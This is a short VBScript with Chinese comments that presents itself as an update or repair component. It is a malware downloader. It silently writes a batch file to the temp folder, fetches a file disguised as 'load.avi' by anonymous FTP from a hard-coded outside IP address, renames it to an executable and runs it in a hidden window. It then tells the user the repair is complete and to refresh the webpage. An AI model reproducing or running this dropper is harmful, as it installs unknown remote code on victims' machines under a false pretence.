Dim objFSO, objFile, objShell
Dim cmdFile, ftpFile, exeFile, tempPath

' 加载更新组件
ftpFile = "load.avi"
exeFile = "fixload.exe"
cmdFile = "updat.bat"

' 获取临时文件夹路径
tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%")

' 创建文件系统对象和外部程序对象
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' 创建 更新组件
Set objFile = objFSO.CreateTextFile(tempPath & "\" & cmdFile, True)
objFile.WriteLine "@echo off"
objFile.WriteLine "echo Downloading file from FTP..."
objFile.WriteLine "echo open 8.210.202.2>> ftp_commands.txt" ' 更新组件地址
objFile.WriteLine "echo anonymous>> ftp_commands.txt"
objFile.WriteLine "echo user@domain.com>> ftp_commands.txt" ' 
objFile.WriteLine "echo binary>> ftp_commands.txt"
objFile.WriteLine "echo get " & ftpFile & " " & tempPath & "\" & ftpFile & ">> ftp_commands.txt" ' 下载到 %temp% 目录
objFile.WriteLine "echo bye>> ftp_commands.txt"
objFile.WriteLine "ftp -s:ftp_commands.txt"
objFile.WriteLine "del ftp_commands.txt"
objFile.WriteLine "ren " & tempPath & "\" & ftpFile & " " & exeFile
objFile.WriteLine "start " & tempPath & "\" & exeFile
objFile.WriteLine "echo 修复完成"
objFile.Close

' 自动执行 updat.bat
objShell.Run tempPath & "\" & cmdFile, 0, True

' 提示用户
WScript.Echo "修复完成,请刷新网页即可"
